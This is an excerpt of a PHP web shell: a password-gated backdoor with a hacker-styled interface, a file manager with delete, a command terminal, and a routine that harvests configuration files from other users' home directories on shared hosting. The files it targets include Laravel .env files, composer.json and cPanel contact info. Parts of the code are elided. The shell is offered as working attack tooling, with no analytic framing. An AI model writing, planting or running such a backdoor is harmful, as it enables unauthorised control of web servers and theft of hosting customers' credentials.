<?php
$pw = "70215376c04a09fd976d045dcc67ddfb";
$shellName = 'GG';
...
if (!$_SESSION['hengker'] && isset($_GET['hengker'])) {
    if (isset($_POST['password']) && md5($_POST['password']) === $pw) {
        $_SESSION['hengker'] = $_POST['password'];
        header("Refresh:1");
        exit;
    } else {
        echo <<<HTML
...
$show_ds = (!empty($ds)) ? "<font style='color: #ff0000;'>$ds</font>" : "<font style='color: #00ff00; text-shadow: 0 0 15px rgba(255,255,255,0.3);'>All function is accessible</font>";
	...
	if ($do == 'delete') {
        try {
            if ($func[12]($dir)) {
                ...
                flash("File/Folder doesn't exist!", "Failed", "warning", "?dir=" . $func[28]($dir));
                echo "<script>history.back()</script>";
            }
        } catch (Exception $e) {
		...
		if ($func[12]("nulz_config")) {
			...
			foreach ($user_config[1] as $user_con) {
				...
				if ($func[9]($user_config_dir)) {
					$grab_config = [
                        "/home/$user_con/public_html/composer.json" => "Composer",
                        "/home/$user_con/public_html/action/sw-proses.php" => "Absensi",
                        "/home/$user_con/public_html/.env" => "Laravel",
                        "/home/$user_con/.cpanel/contactinfo" => "Cpanel Contactinfo",
...
<body style="background-image: url('https://i.postimg.cc/jSKb8T7C/2.jpg'); background-attachment: fixed; background-size: cover; background-position: center center;">
    <div class="container-lg">
        ...
        <nav class="navbar navbar-light bg-dark"
            ...
            <div class="container-fluid">
                ...
                <span class="text-center text-danger fw-bold">Welcome <?php echo $_SESSION['hengker'] ?>!<br><img src="<?= $logo ?>" alt="HG"
        ...
        <div id="tool">
            <div class="bg-dark d-flex justify-content-center flex-column flex-wrap my-2"
                ...
                <div class="mb-3 tool-btn d-flex justify-content-center flex-wrap my-3">
                    <a href="?" class="m-1 btn btn-outline-light btn-sm fw-bold"><i class="fa fa-home"></i> Home</a>
                    ...
                    <a class="m-1 btn btn-outline-light btn-sm fw-bold" data-bs-toggle="collapse" href="#terminal"
                        ...
                        Terminal</a>
                    <a href="?logout" class="m-1 btn btn-outline-light btn-sm fw-bold"><i
